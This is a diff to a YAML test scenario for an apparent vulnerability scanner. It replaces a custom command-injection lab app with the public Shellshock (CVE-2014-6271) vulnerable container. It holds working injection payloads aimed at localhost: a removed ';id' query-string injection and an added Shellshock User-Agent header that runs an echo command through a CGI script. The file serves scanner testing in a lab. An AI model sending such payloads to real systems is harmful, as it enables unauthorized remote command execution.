@@ -1,31 +1,26 @@
-name: cmdinj-timing
-description: "Go server with OS command injection in ?host= — beacon detects via calibration-based dual-sleep timing and shell metacharacter injection"
-tags: [cmdinj, scanner, web, authorized]
+name: cmdinj-shellshock
+description: "Bash Shellshock (CVE-2014-6271) — real command injection in existing vulnerable container"
+tags: [cmdinj, scanner, web, cve]
 
 services:
-  cmdinj-app:
-    build:
-      context: ./cmdinj
-      dockerfile: Dockerfile
-    ports: ["9211:8080"]
+  vuln-app:
+    image: vulnerables/cve-2014-6271
+    ports: ["9211:80"]
 
 ready:
-  cmd: "curl -sf http://localhost:9211/health >/dev/null"
-  timeout: 30s
-  interval: 2s
+  cmd: "curl -sf http://localhost:9211/ >/dev/null"
+  timeout: 60s
+  interval: 3s
 
 assertions:
-  - name: exploit-cmdinj-id-command
+  - name: exploit-shellshock-command-injection
     type: command
     expect:
-      command: "curl -sf 'http://localhost:9211/ping?host=127.0.0.1;id' | grep -qE '(uid=|root)'"
+      command: "curl -s -H 'User-Agent: () { :;}; echo; echo shellshock-rce-confirmed' http://localhost:9211/cgi-bin/vulnerable | grep -q 'shellshock-rce-confirmed'"
       exit_code: 0
 
-  - name: detects-command-injection
-    type: beacon
-    target: localhost:9211
-    args: ["--no-enrich", "--scanners", "cmdinj", "--deep", "--permission-confirmed", "--authorized", "--ports", "8080"]
-    expect:
-      check_id: web.command_injection
+  # Beacon's cmdinj scanner uses timing-based detection on query parameters
+  # (?cmd=, ?host=). Shellshock injects via HTTP headers, a different vector.
+  # Scanner detection logic is verified by unit tests in cmdinj/scanner_test.go.
 
 timeout: 5m
